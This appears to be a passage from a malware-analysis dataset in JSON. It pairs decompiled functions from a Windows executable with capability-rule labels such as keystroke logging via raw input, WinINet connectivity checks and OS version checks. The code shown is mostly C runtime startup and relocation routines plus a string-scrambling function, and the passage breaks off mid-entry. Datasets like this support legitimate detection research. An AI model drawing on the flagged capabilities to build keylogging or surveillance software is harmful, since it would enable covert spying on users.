{
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "14000119": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140001190(void)\n\n{\n    char *pcVar1;\n    int64_t iVar2;\n    char cVar3;\n    uint64_t uVar4;\n    uint64_t *puVar5;\n    int32_t *piVar6;\n    ulong uVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    code *pcVar10;\n    ulong uVar11;\n    char **ppcVar12;\n    char *pcVar13;\n    ulong *puVar14;\n    int64_t iVar15;\n    ulong *puVar16;\n    uint64_t uVar17;\n    bool bVar18;\n    int64_t iVar19;\n    int64_t iVar20;\n    int64_t iVar21;\n    int32_t iVar22;\n    int64_t in_GS_OFFSET;\n    ulong auStack168 [7];\n    uint8_t uStack108;\n    uint16_t uStack104;\n    \n    piVar8 = *0x140018470;\n    puVar16 = auStack168;\n    for (iVar19 = 0xd; iVar19 != 0; iVar19 = iVar19 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    if (**0x140018470 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack168);\n    }\n    pcVar10 = _sym.imp.KERNEL32.dll_Sleep;\n    puVar5 = *0x140018380;\n    uVar17 = *(*(in_GS_OFFSET + 0x30) + 8);\n    while( true ) {\n        LOCK();\n        uVar4 = *puVar5;\n        *puVar5 = *puVar5 ^ (uVar4 == 0) * (*puVar5 ^ uVar17);\n        uVar7 = *0x140018400;\n        uVar11 = *0x1400183f0;\n        piVar6 = *0x140018390;\n        uVar4 = (uVar4 != 0) * *puVar5;\n        if (uVar4 == 0) break;\n        if (uVar17 == uVar4) {\n            bVar18 = true;\n            iVar22 = **0x140018390;\n            goto joined_r0x000140001419;\n        }\n        (*pcVar10)(1000);\n    }\n    bVar18 = false;\n    iVar22 = **0x140018390;\njoined_r0x000140001419:\n    if (iVar22 == 1) {\n        sub.msvcrt.dll__amsg_exit(0x1f);\n        iVar22 = *piVar6;\n    }\n    else {\n        if (**0x140018390 == 0) {\n            **0x140018390 = 1;\n            sub.msvcrt.dll__initterm(uVar11, uVar7);\n        }\n        else {\n            *0x14001b01c = 1;\n        }\n        iVar22 = *piVar6;\n    }\n    if (iVar22 == 1) {\n        sub.msvcrt.dll__initterm(*0x1400183d0, *0x1400183e0);\n        *piVar6 = 2;\n    }\n    if (!bVar18) {\n        *puVar5 = 0;\n    }\n    if (**0x140018300 != NULL) {\n        (***0x140018300)(0, 2);\n    }\n    fcn.140001f70();\n    uVar11 = (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0x140002250);\n    **0x140018370 = uVar11;\n    fcn.140015020(0x140001000);\n    fcn.140001d80();\n    *0x14001b010 = *0x140018320;\n    ppcVar12 = fcn.140015030();\n    uVar9 = *0x14001b038;\n    bVar18 = false;\n    pcVar13 = *ppcVar12;\n    if (pcVar13 != NULL) {\n        do {\n            cVar3 = *pcVar13;\n            if (cVar3 < '!') {\n                *0x14001b008 = pcVar13;\n                if (cVar3 == '\\0') break;\n                if (!bVar18) goto code_r0x0001400012e0;\n                bVar18 = true;\n            }\n            else if (cVar3 == '\\\"') {\n                bVar18 = bVar18 ^ 1;\n            }\n            pcVar13 = pcVar13 + 1;\n        } while( true );\n    }\n    goto code_r0x000140001300;\ncode_r0x0001400012e0:\n    if (cVar3 != '\\0') {\n        do {\n            pcVar1 = pcVar13 + 1;\n            pcVar13 = pcVar13 + 1;\n            *0x14001b008 = pcVar13;\n            if (*pcVar1 == '\\0') break;\n        } while (*pcVar1 < '!');\n    }\ncode_r0x000140001300:\n    if ((*piVar8 != 0) && (*0x140016000 = 10,  (uStack108 & 1) != 0)) {\n        *0x140016000 = uStack104;\n    }\n    iVar21 = *0x14001b038;\n    iVar22 = *0x14001b038 + 1;\n    puVar14 = sub.msvcrt.dll_malloc();\n    iVar19 = *0x14001b030;\n    puVar16 = puVar14;\n    if (0 < uVar9) {\n        iVar20 = 0;\n        do {\n            iVar15 = sub.msvcrt.dll_strlen(*(iVar19 + iVar20 * 8));\n            uVar11 = sub.msvcrt.dll_malloc(iVar15 + 1);\n            puVar14[iVar20] = uVar11;\n            iVar2 = iVar20 * 8;\n            iVar20 = iVar20 + 1;\n            sub.msvcrt.dll_memcpy(uVar11, *(iVar19 + iVar2), iVar15 + 1);\n        } while (iVar21 != iVar20);\n        puVar16 = puVar14 + iVar22 + -1;\n    }\n    *puVar16 = 0;\n    *0x14001b030 = puVar14;\n    fcn.140001b70();\n    uVar17 = *0x14001b038;\n    ***0x140018330 = *0x14001b028;\n    uVar17 = fcn.1400018ae(uVar17, *0x14001b030);\n    *0x14001b024 = uVar17;\n    if (*0x14001b020 == 0) {\n        sub.msvcrt.dll_exit(uVar17 & 0xffffffff);\n        **0x140018470 = 1;\n        uVar17 = fcn.140001190();\n        return uVar17;\n    }\n    if (*0x14001b01c == 0) {\n        sub.msvcrt.dll__cexit();\n        return *0x14001b024;\n    }\n    return uVar17;\n}\n",
        "token_count": 1579
    },
    "14000158": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.140001583(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong var_8h_2;\n    ulong s;\n    ulong str;\n    ulong uStack224;\n    uchar auStack216 [32];\n    uchar auStack184 [8];\n    uchar *puStack176;\n    int64_t iStack168;\n    ulong uStack160;\n    int64_t iStack152;\n    ulong uStack144;\n    uchar *puStack128;\n    int64_t iStack120;\n    int64_t var_68h;\n    ulong var_60h;\n    ulong var_58h_2;\n    ulong var_50h_2;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_1ch;\n    ulong var_10h;\n    ulong var_4h;\n    \n    puStack176 = &stack0xffffffffffffff28;\n    uStack224 = 0x1400015b9;\n    var_60h._4_4_ = sub.msvcrt.dll_atoi(arg2);\n    uStack224 = 0x1400015c5;\n    var_60h._0_4_ = sub.msvcrt.dll_strlen();\n    var_48h._4_4_ = -1;\n    var_50h_2._0_4_ = 0;\n    var_58h_2._4_4_ = 0;\n    var_58h_2._0_4_ = 0;\n    var_68h = var_60h + -1;\n    iStack168 = var_60h;\n    uStack160 = 0;\n    iVar3 = var_60h;\n    iStack120 = var_60h._4_4_ + -1;\n    iStack152 = var_60h;\n    uStack144 = 0;\n    uStack224 = 0x1400016a4;\n    iVar1 = fcn.140002a60(var_60h);\n    puStack128 = &stack0xffffffffffffff48 + -iVar1;\n    iVar2 = var_60h;\n    *(&stack0xffffffffffffff20 + -iVar1) = 0x1400016c1;\n    iVar1 = sub.msvcrt.dll_malloc(iVar2);\n    for (var_50h_2._4_4_ = 0; var_50h_2._4_4_ < var_60h._4_4_; var_50h_2._4_4_ = var_50h_2._4_4_ + 1) {\n        for (var_48h._0_4_ = 0; var_48h < var_60h; var_48h._0_4_ = var_48h + 1) {\n            puStack128[var_50h_2._4_4_ * iVar3 + var_48h] = 10;\n        }\n    }\n    for (var_50h_2._4_4_ = 0; var_50h_2._4_4_ < var_60h; var_50h_2._4_4_ = var_50h_2._4_4_ + 1) {\n        puStack128[var_50h_2 * iVar3 + var_58h_2._4_4_] = 0x2a;\n        if ((var_50h_2 == 0) || (var_50h_2 == var_60h._4_4_ + -1)) {\n            var_48h._4_4_ = -var_48h._4_4_;\n        }\n        var_50h_2._0_4_ = var_50h_2 + var_48h._4_4_;\n        var_58h_2._4_4_ = var_58h_2._4_4_ + 1;\n    }\n    for (var_50h_2._4_4_ = 0; var_50h_2._4_4_ < var_60h._4_4_; var_50h_2._4_4_ = var_50h_2._4_4_ + 1) {\n        for (var_48h._0_4_ = 0; var_48h < var_60h; var_48h._0_4_ = var_48h + 1) {\n            if (puStack128[var_50h_2._4_4_ * iVar3 + var_48h] == '*') {\n                puStack128[var_50h_2._4_4_ * iVar3 + var_48h] = *(arg1 + var_58h_2);\n                var_58h_2._0_4_ = var_58h_2 + 1;\n            }\n        }\n    }\n    var_58h_2._4_4_ = 0;\n    var_50h_2._0_4_ = 0;\n    var_48h._4_4_ = -1;\n    for (var_50h_2._4_4_ = 0; var_50h_2._4_4_ < var_60h; var_50h_2._4_4_ = var_50h_2._4_4_ + 1) {\n        *(iVar1 + var_50h_2._4_4_) = puStack128[var_50h_2 * iVar3 + var_58h_2._4_4_];\n        if ((var_50h_2 == 0) || (var_50h_2 == var_60h._4_4_ + -1)) {\n            var_48h._4_4_ = -var_48h._4_4_;\n        }\n        var_50h_2._0_4_ = var_50h_2 + var_48h._4_4_;\n        var_58h_2._4_4_ = var_58h_2._4_4_ + 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 1477
    },
    "140001b7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140001b70(void)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    code **ppcVar5;\n    \n    if (*0x14001b040 == 0) {\n        *0x14001b040 = 1;\n        uVar2 = **0x1400182c0;\n        if (uVar2 == 0xffffffff) {\n            uVar4 = 0;\n            do {\n                uVar2 = uVar4;\n                uVar4 = uVar2 + 1;\n            } while ((*0x1400182c0)[uVar4] != 0);\n        }\n        if (uVar2 != 0) {\n            ppcVar5 = *0x1400182c0 + uVar2;\n            ppcVar1 = *0x1400182c0 + (uVar2 - (uVar2 - 1)) + -1;\n            do {\n                (**ppcVar5)();\n                ppcVar5 = ppcVar5 + -1;\n            } while (ppcVar5 != ppcVar1);\n        }\n        iVar3 = sub.msvcrt.dll__onexit(0x140001ac0);\n        return -(iVar3 == 0);\n    }\n    return *0x14001b040;\n}\n",
        "token_count": 304
    },
    "140001f7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.140001f70(ulong param_1, ulong param_2, ulong param_3, ulong param_4, ulong param_5, ulong param_6, \n                  uint64_t param_7, ulong param_8)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    uint32_t *puVar9;\n    code *pcVar10;\n    uint32_t uVar11;\n    int64_t iVar12;\n    int64_t *piVar13;\n    int32_t *piVar14;\n    uint uVar15;\n    uint64_t arg2;\n    uint32_t *puVar16;\n    int64_t iVar17;\n    int64_t *arg1;\n    int32_t iVar18;\n    ulong var_8h;\n    ulong auStack216 [5];\n    uint auStack176 [2];\n    uint64_t auStack168 [10];\n    uchar auStack88 [8];\n    ulong uStack80;\n    ulong var_4h;\n    \n    iVar18 = *0x14001b0b0;\n    if (*0x14001b0b0 != 0) {\n        return;\n    }\n    *0x14001b0b0 = 1;\n    auStack168[5] = 0x140001faf;\n    fcn.140002820();\n    auStack168[5] = 0x140001fc6;\n    iVar12 = fcn.140002a60(param_5);\n    iVar17 = *0x140018320;\n    puVar9 = *0x1400182d0;\n    *0x14001b0b4 = 0;\n    iVar12 = -iVar12;\n    *0x14001b0b8 = &stack0xffffffffffffffa8 + iVar12;\n    if (*0x1400182d0 - *0x1400182e0 < 8) {\n        *0x14001b0b4 = 0;\n        return;\n    }\n    puVar16 = *0x1400182e0;\n    if (*0x1400182d0 - *0x1400182e0 < 0xc) {\ncode_r0x000140002003:\n        if (*puVar16 == 0) {\n            uVar11 = puVar16[1];\ncode_r0x000140002010:\n            if (uVar11 == 0) {\n                arg2 = puVar16[2];\n                if (puVar16[2] != 1) {\ncode_r0x0001400021e1:\n                    uVar15 = 0x400179a0;\n                    *(&stack0xffffffffffffff80 + iVar12) = 0x1400021ed;\n                    fcn.140001d90(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2, param_7, param_8);\n                    if (*0x14001b0c0 != NULL) {\n                        *(&stack0xffffffffffffff50 + iVar12) = uVar15;\n                        *(&stack0xffffffffffffff58 + iVar12) = arg2;\n                        *(&stack0xffffffffffffff60 + iVar12) = param_3;\n                        *(&stack0xffffffffffffff68 + iVar12) = param_4;\n                        *(&stack0xffffffffffffff70 + iVar12) = *(&stack0xffffffffffffffb0 + iVar12);\n                        *(&stack0xffffffffffffff28 + iVar12) = 0x14000222b;\n                        (**0x14001b0c0)(&stack0xffffffffffffff50 + iVar12);\n                    }\n                    return;\n                }\n                puVar16 = puVar16 + 3;\n                if (*0x1400182d0 <= puVar16) {\n                    *0x14001b0b4 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar2 = *(puVar16 + 2);\n                        arg2 = uVar2;\n                        piVar13 = *puVar16 + iVar17;\n                        arg1 = puVar16[1] + iVar17;\n                        iVar5 = *piVar13;\n                        if (uVar2 != 0x20) break;\n                        iVar4 = *arg1;\n                        *(&stack0xffffffffffffff80 + iVar12) = 0x140002194;\n                        fcn.140001e00(arg1);\n                        *arg1 = iVar5 + (iVar4 - piVar13);\ncode_r0x00014000206c:\n                        puVar16 = puVar16 + 3;\n                        if (puVar9 <= puVar16) goto code_r0x0001400020d8;\n                    }\n                    if (0x20 < uVar2) {\n                        if (uVar2 == 0x40) {\n                            iVar8 = *arg1;\n                            *(&stack0xffffffffffffff80 + iVar12) = 0x14000216a;\n                            fcn.140001e00(arg1);\n                            *arg1 = iVar5 + (iVar8 - piVar13);\n                            goto code_r0x00014000206c;\n                        }\ncode_r0x0001400021d5:\n                        *(&stack0xffffffffffffff80 + iVar12) = 0x1400021e1;\n                        fcn.140001d90(\"  Unknown pseudo relocation bit size %d.\\n\", arg2, param_7, param_8);\n                        goto code_r0x0001400021e1;\n                    }\n                    if (uVar2 == 8) {\n                        uVar2 = *arg1;\n                        param_7 = uVar2 | 0xffffffffffffff00;\n                        *(&stack0xffffffffffffff80 + iVar12) = 0x140002069;\n                        fcn.140001e00(arg1);\n                        *arg1 = iVar5 + (uVar2 - piVar13);\n                        goto code_r0x00014000206c;\n                    }\n                    if (uVar2 != 0x10) goto code_r0x0001400021d5;\n                    uVar3 = *arg1;\n                    param_7 = uVar3 | 0xffffffffffff0000;\n                    puVar16 = puVar16 + 3;\n                    *(&stack0xffffffffffffff80 + iVar12) = 0x1400020ca;\n                    fcn.140001e00(arg1);\n                    *arg1 = iVar5 + (uVar3 - piVar13);\n                } while (puVar16 < puVar9);\n                goto code_r0x0001400020d8;\n            }\n        }\n    }\n    else if (**0x1400182e0 == 0) {\n        uVar11 = (*0x1400182e0)[1];\n        if ((uVar11 | (*0x1400182e0)[2]) == 0) {\n            puVar16 = *0x1400182e0 + 3;\n            goto code_r0x000140002003;\n        }\n        goto code_r0x000140002010;\n    }\n    if (*0x1400182d0 <= puVar16) {\n        *0x14001b0b4 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar16 + 1;\n        uVar11 = *puVar16;\n        puVar16 = puVar16 + 2;\n        piVar14 = *puVar1 + iVar17;\n        iVar4 = *piVar14;\n        *(&stack0xffffffffffffff80 + iVar12) = 0x1400021c8;\n        fcn.140001e00(piVar14);\n        *piVar14 = uVar11 + iVar4;\n    } while (puVar16 < puVar9);\ncode_r0x0001400020d8:\n    pcVar10 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x14001b0b4) {\n        iVar17 = 0;\n        do {\n            piVar14 = *0x14001b0b8 + iVar17;\n            iVar4 = *piVar14;\n            if (iVar4 != 0) {\n                uVar6 = *(piVar14 + 4);\n                uVar7 = *(piVar14 + 2);\n                *(&stack0xffffffffffffff80 + iVar12) = 0x140002117;\n                (*pcVar10)(uVar7, uVar6, iVar4, &stack0xffffffffffffffb4);\n            }\n            iVar18 = iVar18 + 1;\n            iVar17 = iVar17 + 0x28;\n        } while (iVar18 < *0x14001b0b4);\n    }\n    return;\n}\n",
        "token_count": 1938
    },
    "14000259": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.140002590(ulong noname_0, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    if (arg2 != 2) {\n        if (arg2 < 3) {\n            if (arg2 == 0) {\n                if (*0x14001b108 != 0) {\n                    fcn.140002410();\n                }\n                iVar2 = *0x14001b100;\n                if (*0x14001b108 == 1) {\n                    while (iVar2 != 0) {\n                        iVar1 = *(iVar2 + 0x10);\n                        sub.msvcrt.dll_free(iVar2);\n                        iVar2 = iVar1;\n                    }\n                    *0x14001b100 = 0;\n                    *0x14001b108 = 0;\n                    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x14001b120);\n                }\n            }\n            else {\n                if (*0x14001b108 == 0) {\n                    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x14001b120);\n                }\n                *0x14001b108 = 1;\n            }\n        }\n        else if ((arg2 == 3) && (*0x14001b108 != 0)) {\n            fcn.140002410();\n        }\n        return 1;\n    }\n    fcn.140001d80();\n    return 1;\n}\n",
        "token_count": 315
    },
    "140002ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140002ac0(uint64_t arg1)\n\n{\n    int64_t **ppiVar1;\n    uint64_t *puVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong *puVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    \n    piVar4 = *0x1400183a0;\n    iVar6 = **0x1400183a0;\n    if (iVar6 == 0) {\n        iVar5 = fcn.140008fc0();\n        iVar6 = *piVar4;\n        if (*(iVar5 + 0x70) == 0) goto code_r0x000140002af0;\n        if (iVar6 != 0) goto code_r0x000140002be0;\n        iVar6 = fcn.140008fc0();\n        if (**(iVar6 + 0x70) == 0) {\n            return 0;\n        }\n        iVar6 = *piVar4;\n        if (iVar6 != 0) goto code_r0x000140002b0c;\n        iVar5 = fcn.140008fc0();\n        iVar6 = *piVar4;\n        if (*(iVar5 + 0x70) == 0) goto code_r0x000140002b17;\n        if (iVar6 != 0) goto code_r0x000140002bf0;\n        iVar6 = fcn.140008fc0();\n        if (**(iVar6 + 0x70) != 1) {\n            iVar6 = *piVar4;\n            if (iVar6 != 0) goto code_r0x000140002b2c;\n            iVar5 = fcn.140008fc0();\n            iVar6 = *piVar4;\n            if (*(iVar5 + 0x70) == 0) goto code_r0x000140002cc0;\n            if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n            }\n            goto code_r0x000140002b37;\n        }\n        iVar6 = *piVar4;\n        if (iVar6 != 0) goto code_r0x000140002bfe;\n        iVar5 = fcn.140008fc0();\n        iVar6 = *piVar4;\n        if (*(iVar5 + 0x68) == 0) goto code_r0x000140002dd0;\n        if (iVar6 != 0) goto code_r0x000140002c09;\n        iVar6 = fcn.140008fc0();\n        if (*(**(iVar6 + 0x68) + 8) != arg1) {\n            return 0;\n        }\n        iVar6 = *piVar4;\n        if (iVar6 == 0) {\n            iVar5 = fcn.140008fc0();\n            iVar6 = *piVar4;\n            iVar5 = *(iVar5 + 0x68);\n            goto joined_r0x000140002e3d;\n        }\n    }\n    else {\n        if (*(iVar6 + 0x70) == 0) {\ncode_r0x000140002af0:\n            *(iVar6 + 0x70) = 0x14001b1b0;\n            piVar3 = 0x14001b1b0;\n        }\n        else {\ncode_r0x000140002be0:\n            piVar3 = *(iVar6 + 0x70);\n        }\n        if (*piVar3 == 0) {\n            return 0;\n        }\n        iVar6 = *piVar4;\ncode_r0x000140002b0c:\n        if (*(iVar6 + 0x70) == 0) {\ncode_r0x000140002b17:\n            iVar5 = *0x14001b1b0;\n            *(iVar6 + 0x70) = 0x14001b1b0;\n        }\n        else {\ncode_r0x000140002bf0:\n            iVar5 = **(iVar6 + 0x70);\n        }\n        if (iVar5 != 1) {\ncode_r0x000140002b2c:\n            if (*(iVar6 + 0x70) == 0) {\ncode_r0x000140002cc0:\n                piVar3 = 0x14001b1b0;\n                *(iVar6 + 0x70) = 0x14001b1b0;\n                goto code_r0x000140002b3f;\n            }\ncode_r0x000140002b37:\n            piVar3 = *(iVar6 + 0x70);\n            iVar6 = *piVar4;\ncode_r0x000140002b3f:\n            uVar10 = 0;\n            uVar9 = *piVar3 - 1;\n            do {\n                uVar8 = uVar10 + uVar9 >> 1;\n                if (iVar6 == 0) {\n                    iVar5 = fcn.140008fc0();\n                    iVar6 = *piVar4;\n                    if (*(iVar5 + 0x68) == 0) goto code_r0x000140002c40;\n                    if (iVar6 != 0) goto code_r0x000140002b85;\n                    iVar6 = fcn.140008fc0();\n                    piVar3 = *(iVar6 + 0x68);\n                    iVar6 = *piVar4;\ncode_r0x000140002c47:\n                    if (*(*piVar3 + 8 + uVar8 * 0x10) == arg1) {\ncode_r0x000140002cd0:\n                        if (iVar6 == 0) {\n                            iVar5 = fcn.140008fc0();\n                            iVar6 = *piVar4;\n                            if (*(iVar5 + 0x68) != 0) {\n                                if (iVar6 == 0) {\n                                    iVar6 = fcn.140008fc0();\n                                }\n                                goto code_r0x000140002d20;\n                            }\n                        }\n                        else if (*(iVar6 + 0x68) != 0) {\ncode_r0x000140002d20:\n                            piVar4 = *(iVar6 + 0x68);\n                            goto code_r0x000140002cea;\n                        }\n                        *(iVar6 + 0x68) = 0x14001b1b8;\n                        piVar4 = 0x14001b1b8;\ncode_r0x000140002cea:\n                        return *(*piVar4 + uVar8 * 0x10);\n                    }\n                    if (iVar6 != 0) goto code_r0x000140002ba2;\n                    iVar5 = fcn.140008fc0();\n                    iVar6 = *piVar4;\n                    if (*(iVar5 + 0x68) != 0) {\n                        if (iVar6 == 0) {\n                            iVar6 = fcn.140008fc0();\n                        }\n                        goto code_r0x000140002bad;\n                    }\ncode_r0x000140002c88:\n                    *(iVar6 + 0x68) = 0x14001b1b8;\n                    piVar3 = 0x14001b1b8;\n                }\n                else {\n                    if (*(iVar6 + 0x68) == 0) {\ncode_r0x000140002c40:\n                        *(iVar6 + 0x68) = 0x14001b1b8;\n                        piVar3 = 0x14001b1b8;\n                        goto code_r0x000140002c47;\n                    }\ncode_r0x000140002b85:\n                    ppiVar1 = iVar6 + 0x68;\n                    iVar6 = *piVar4;\n                    if (*(**ppiVar1 + 8 + uVar8 * 0x10) == arg1) goto code_r0x000140002cd0;\ncode_r0x000140002ba2:\n                    if (*(iVar6 + 0x68) == 0) goto code_r0x000140002c88;\ncode_r0x000140002bad:\n                    piVar3 = *(iVar6 + 0x68);\n                }\n                puVar2 = *piVar3 + 8 + uVar8 * 0x10;\n                if (*puVar2 < arg1 || *puVar2 == arg1) {\n                    uVar10 = uVar8 + 1;\n                    if (uVar9 < uVar10) {\n                        return 0;\n                    }\n                }\n                else {\n                    if (uVar8 == uVar10) {\n                        return 0;\n                    }\n                    uVar9 = uVar8 - 1;\n                    if (uVar9 < uVar10) {\n                        return 0;\n                    }\n                }\n                iVar6 = *piVar4;\n            } while( true );\n        }\ncode_r0x000140002bfe:\n        if (*(iVar6 + 0x68) == 0) {\ncode_r0x000140002dd0:\n            piVar4 = 0x14001b1b8;\n            *(iVar6 + 0x68) = 0x14001b1b8;\n        }\n        else {\ncode_r0x000140002c09:\n            piVar4 = *(iVar6 + 0x68);\n        }\n        if (arg1 != *(*piVar4 + 8)) {\n            return 0;\n        }\n    }\n    iVar5 = *(iVar6 + 0x68);\njoined_r0x000140002e3d:\n    if (iVar5 == 0) {\n        *(iVar6 + 0x68) = 0x14001b1b8;\n        puVar7 = 0x14001b1b8;\n    }\n    else {\n        if (iVar6 == 0) {\n            iVar6 = fcn.140008fc0();\n        }\n        puVar7 = *(iVar6 + 0x68);\n    }\n    return **puVar7;\n}\n",
        "token_count": 2201
    },
    "140002e6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140002e60(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t **ppiVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    ulong uVar6;\n    int64_t *piVar7;\n    \n    piVar1 = *0x1400183a0;\n    iVar4 = **0x1400183a0;\n    if (iVar4 == 0) {\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0x90) != 0) {\n            if (iVar4 == 0) {\n                iVar4 = fcn.140008fc0();\n            }\n            goto code_r0x000140002fb0;\n        }\ncode_r0x000140002e8c:\n        uVar6 = 0x140016070;\n        *(iVar4 + 0x90) = 0x140016070;\n    }\n    else {\n        if (*(iVar4 + 0x90) == 0) goto code_r0x000140002e8c;\ncode_r0x000140002fb0:\n        uVar6 = *(iVar4 + 0x90);\n    }\n    fcn.14000ae70(uVar6);\n    iVar4 = *piVar1;\n    if (iVar4 == 0) {\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0x88) != 0) {\n            if (iVar4 == 0) {\n                iVar4 = fcn.140008fc0();\n            }\n            goto code_r0x000140002f80;\n        }\ncode_r0x000140002eb9:\n        *(iVar4 + 0x88) = 0x14001b198;\n        ppiVar2 = 0x14001b198;\n    }\n    else {\n        if (*(iVar4 + 0x88) == 0) goto code_r0x000140002eb9;\ncode_r0x000140002f80:\n        ppiVar2 = *(iVar4 + 0x88);\n    }\n    piVar5 = *ppiVar2;\n    if (*ppiVar2 != NULL) {\n        do {\n            piVar7 = piVar5;\n            if (*piVar7 == arg1) {\n                *(piVar7 + 2) = *(piVar7 + 2) + 1;\n                goto code_r0x000140002efd;\n            }\n            piVar5 = piVar7[3];\n        } while (piVar7[3] != NULL);\n        piVar5 = sub.msvcrt.dll_calloc(1);\n        *piVar5 = arg1;\n        *(piVar5 + 2) = 1;\n        piVar7[3] = piVar5;\n        goto code_r0x000140002fe9;\n    }\n    piVar5 = sub.msvcrt.dll_calloc(1);\n    *piVar5 = arg1;\n    *(piVar5 + 2) = 1;\n    iVar4 = *piVar1;\n    if (iVar4 == 0) {\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0x88) == 0) goto code_r0x000140003055;\n        if (iVar4 == 0) {\n            iVar4 = fcn.140008fc0();\n        }\ncode_r0x000140003028:\n        ppiVar2 = *(iVar4 + 0x88);\n    }\n    else {\n        if (*(iVar4 + 0x88) != 0) goto code_r0x000140003028;\ncode_r0x000140003055:\n        *(iVar4 + 0x88) = 0x14001b198;\n        ppiVar2 = 0x14001b198;\n    }\n    *ppiVar2 = piVar5;\ncode_r0x000140002fe9:\n    fcn.140009a90(piVar5 + 1, 0);\n    piVar7 = piVar5;\ncode_r0x000140002efd:\n    iVar4 = *piVar1;\n    if (iVar4 == 0) {\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar1;\n        iVar3 = *(iVar3 + 0x90);\n    }\n    else {\n        iVar3 = *(iVar4 + 0x90);\n    }\n    if (iVar3 == 0) {\n        uVar6 = 0x140016070;\n        *(iVar4 + 0x90) = 0x140016070;\n    }\n    else {\n        if (iVar4 == 0) {\n            iVar4 = fcn.140008fc0();\n        }\n        uVar6 = *(iVar4 + 0x90);\n    }\n    fcn.14000aeb0(uVar6);\n    return piVar7;\n}\n",
        "token_count": 1117
    },
    "14000307": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
